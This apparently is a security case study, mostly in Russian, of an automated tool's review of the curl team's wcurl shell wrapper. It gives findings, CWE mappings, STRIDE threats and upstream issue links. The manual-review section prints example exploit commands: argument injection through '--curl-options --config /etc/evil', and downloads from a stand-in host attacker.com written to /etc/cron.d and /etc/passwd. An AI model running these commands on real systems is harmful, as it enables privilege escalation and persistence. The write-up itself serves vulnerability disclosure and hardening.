# Case Study: wcurl.sh (curl team, POSIX sh wrapper)

**Четвёртый dogfood-кейс** — после `RequestFilter-java`, `packet-btl2cap-c`, `cve-2026-94266-spec`.

**Первый shell-скрипт.** Production-код от curl team (GitHub: curl/wcurl).

## О материале

- **Файл:** `wcurl` (POSIX sh wrapper around curl)
- **Источник:** https://github.com/curl/wcurl
- **Размер:** 12 926 chars (обрезан до 12 000)
- **Строк:** ~500
- **Язык:** POSIX shell (sh)
- **Роль:** wrapper вокруг curl — argv parser, percent-decode, version gates

## Метрики анализа (v5.10.7)

| Метрика | Значение |
|---|---|
| Level | **D3** |
| Route | stage0 -> stage1 -> stage2 -> stage4 -> stage5 |
| Session | sess-2026-10-14-233330 |
| Audit ID | audit-2026-10-14-531639 |
| Material hash | sha256:f13c8228d493f185... |
| PII | false |
| Completeness | ACCEPTABLE, loss_pct: 0.0% |

## Что Vishap нашёл

**11 risk_nodes** (4 критичных, 5 важных, 2 опционально) + **11 угроз STRIDE**.

### Критичные

| ID | Риск | CWE |
|---|---|---|
| **SEC-1** | Command injection через `--curl-options` (unquoted `set -- ${CURL_OPTIONS}`) | CWE-88 |
| **SEC-2 / RN-6** | Path traversal через `--output` (нет валидации `OUTPUT_PATH`) | CWE-22 |
| **SEC-3 / RN-1** | Parsing `curl --version` через `cut -f2 -d' '` (locale breaks) | CWE-345 |
| **SEC-4** | Нет scheme allowlist (`--proto-default https`, но не `--proto =http,https`) | CWE-939 |

### Важные

- RN-5: комментарий «options are global», но `CURL_OPTIONS` применяется per-URL.
- RN-8 / FP-1: `exec "$@"` заменяет процесс -- нет логирования/ретрая.
- FP-6: нет `--connect-timeout` / `--max-time` -> зависание.
- RN-11: молчаливая деградация на curl < 7.83/7.66/8.16.
- RN-10: при `--output` + multi-URL + `--parallel` порядок суффиксов недетерминирован.
- RN-2: curl 9.x и форки с суффиксами не обрабатываются.

## Проверено вручную (senior review)

**SEC-1 -- подтверждено:**

```sh
L141:  set -- ${CURL_OPTIONS}                              # unquoted
L284:  set -- "$@" ... ${CURL_OPTIONS} --url "${url}"      # unquoted
L303:  CURL_OPTIONS="${CURL_OPTIONS} ${opt}"               # from --curl-options=
L311:  CURL_OPTIONS="${CURL_OPTIONS} ${1}"                 # from --curl-options <arg>
```

**Exploit:**
```bash
wcurl --curl-options "--config /etc/evil" https://example.com
```
-> `curl --config /etc/evil` -> чтение произвольного конфига -> RCE

**SEC-2 -- подтверждено:**

```sh
L318-321: --output=*) opt=...; OUTPUT_PATH="${opt}"    # без валидации
L324-330: -o|-O|--output) OUTPUT_PATH="${1}"           # без валидации
```

**Exploit:**
```bash
wcurl --output /etc/cron.d/evil https://attacker.com/script
wcurl --output ../../etc/passwd https://attacker.com/data
```
-> при root -- произвольная запись

**SEC-4 -- частично:**
```sh
L114:  --proto-default https \
```
Не запрещает `file://`, `gopher://`, `dict://`. Правильно: `--proto "=http,https"`.

## Senior-level находки

### INTERSECTION_RISKS -- exploit chain

> SEC-2 x SEC-4: `file://` + `--output /etc/cron.d/x` -> чтение произвольного файла + запись в системный путь = escalation от root.

### THREAT_MODEL -- 4 trust boundaries

- TB-1: caller -> argv (untrusted)
- TB-2: wcurl -> curl (exec)
- TB-3: wcurl -> filesystem (write)
- TB-4: wcurl -> network

### SILENCE_LAYERS

> Assumption silence: предполагается, что curl в PATH -- настоящий; нет hash/which, нет LC_ALL=C, нет fallback.

## Нюансы -- Vishap прав, но есть контекст

1. **`wcurl` -- wrapper.** Авторы **намеренно** разрешают любые curl-опции через `--curl-options` (L78: use `--config <FILE>`).
2. **`--output` -- фича.** Пользователь явно указывает, куда сохранять.
3. **`--proto-default https`** -- уже лучше, чем ничего.

**Реальные риски:**
- `wcurl` как **библиотека** в других скриптах.
- **Root-запуск** с недоверенными параметрами.
- **CI/CD** с пользовательскими URL.

## Сравнение с SAST

| Инструмент | Что даёт |
|---|---|
| **ShellCheck** | `SC2086` (unquoted) -- синтаксис |
| **Vishap** | 11 рисков + STRIDE + exploit chain + PLAN_B -- семантика |

## Отправлено в upstream

**Issue #108** -- hardening suggestions (argument handling + output path):
https://github.com/curl/wcurl/issues/108

**Issue #109** -- process-level observations (CVE window, breaking change, exit codes):
https://github.com/curl/wcurl/issues/109

Черновики:
- `C:/AI/wcurl-hardening-suggestion.md`
- `C:/AI/wcurl-process-issue-draft.md`

Тон: hardening suggestion + process review (не багрепорт).
Caveat: не claiming CVE, `--curl-options` -- by design.

## Docs analysis (3 extra sessions)

После разбора `wcurl.sh` мы прогнали **документацию** проекта через Vishap:

| Файл | Session | Level | Cost | risk_verdict | Findings |
|---|---|---|---|---|---|
| `CHANGELOG.md` | `sess-2026-10-15-061653-00` | D3 | $0.0066 | REQUIRES_REVIEW | CVE-2025-11563 window, breaking CLI, exit codes |
| `README.md` | `sess-2026-10-15-061653-01` | D3 | $0.0074 | REQUIRES_REVIEW | SEC-1 (critical), SEC-2, missing exit-code contract |
| `wcurl.md` (manpage) | `sess-2026-10-15-061653-02` | D3 | $0.0063 | REQUIRES_REVIEW | SEC-1, SEC-2, SEC-4, version gates |

**Key finding (CHANGELOG):**
> CVE-2025-11563 was declared fixed in v2025.11.04 but v2025.11.09 says it was not.
> 5-day exposure window.

**Key finding (README/wcurl.md):**
> `--curl-options` -- critical argument injection (CWE-88).
> `--output` -- path traversal (CWE-22).
> Exit-code contract undefined for partial multi-URL failures.

Files:
- `result_sess-2026-10-15-061653-0X.json` -- full results.
- `report_sess-2026-10-15-061653-0X.md` -- markdown reports.
- `audit_sess-2026-10-15-061653-0X.json` -- audit trails.

## Выводы

1. **Vishap работает на shell** -- 4-й тип материала (Java + C + spec + sh).
2. **D3, 11 risk_nodes, 4 critical** -- сравнимо с SAST-инструментами.
3. **Подтверждено вручную** -- SEC-1/SEC-2 реальные, SEC-4 частично.
4. **Vishap связал уязвимости** в exploit chain -- senior-level.
5. **Письмо curl team** -- опционально (см. следующий шаг).
